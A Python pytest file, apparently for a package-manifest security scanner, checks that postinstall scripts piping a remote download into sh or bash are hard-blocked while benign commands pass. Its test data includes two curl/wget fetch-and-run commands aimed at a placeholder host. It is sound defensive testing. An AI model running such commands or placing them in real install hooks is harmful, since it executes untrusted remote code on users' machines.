import json
import pytest
from httpx import AsyncClient,ASGITransport
from app.main import app

@pytest.mark.asyncio
@pytest.mark.parametrize('command,blocked',[
 ('curl https://example.invalid/bootstrap.sh | sh',True),
 ('wget -qO- https://example.invalid/run.sh | /bin/bash',True),
 ('node scripts/build.js',False),
 ('curl https://example.invalid/archive.tar -o archive.tar',False),
 ('echo "sh"',False),
])
async def test_manifest_lifecycle_without_dependencies(command,blocked):
 async with AsyncClient(transport=ASGITransport(app=app),base_url='http://test') as c:
  r=await c.post('/analyze',json={'filename':'package.json','content':json.dumps({'scripts':{'postinstall':command},'dependencies':{}})})
 assert r.status_code==200
 x=r.json();found=[f for f in x['findings'] if f.get('details',{}).get('detector_id')=='guardian-network-install-shell']
 assert bool(found)==blocked
 if blocked:
  assert x['decision_floor']=='reject' and found[0]['hard_block'] is True
